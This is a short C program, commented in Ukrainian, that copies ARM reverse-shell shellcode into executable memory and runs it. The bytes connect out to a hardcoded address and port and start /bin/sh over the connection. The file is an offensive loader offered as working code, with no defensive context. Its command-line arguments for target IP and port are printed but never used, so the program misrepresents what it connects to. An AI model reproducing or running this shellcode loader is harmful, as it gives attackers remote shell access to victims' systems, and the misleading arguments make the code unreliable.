
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // Reverse shell shellcode
    unsigned char shellcode[] = "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x19\x71\x00\xe3\x00\x00\x00\xef\x00\x40\xa0\xe1\x60\x10\x8f\xe2\x10\x20\xa0\xe3\x1b\x71\x00\xe3\x00\x00\x00\xef\x00\x00\x50\xe3\x10\x00\x00\x1a\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef\x28\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x11\x5c\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00";
    
    // Параметри для з'єднання
    const char* target_ip = "127.0.0.1";
    int target_port = 4444;
    
    if (argc > 1) target_ip = argv[1];
    if (argc > 2) target_port = atoi(argv[2]);
    
    printf("Довжина shellcode: %zu байт\n", sizeof(shellcode) - 1);
    printf("Спроба підключення до %s:%d...\n", target_ip, target_port);
    
    // Виділяємо пам'ять з правами на виконання
    void *mem = mmap(NULL, sizeof(shellcode),
                   PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Копіюємо shellcode у виділену пам'ять
    memcpy(mem, shellcode, sizeof(shellcode));
    
    printf("Виконання shellcode...\n");
    
    // Виконуємо shellcode
    ((void(*)())mem)();
    
    // Звільняємо пам'ять (до цього рядка ми не дійдемо, якщо execve успішний)
    munmap(mem, sizeof(shellcode));
    return 0;
}
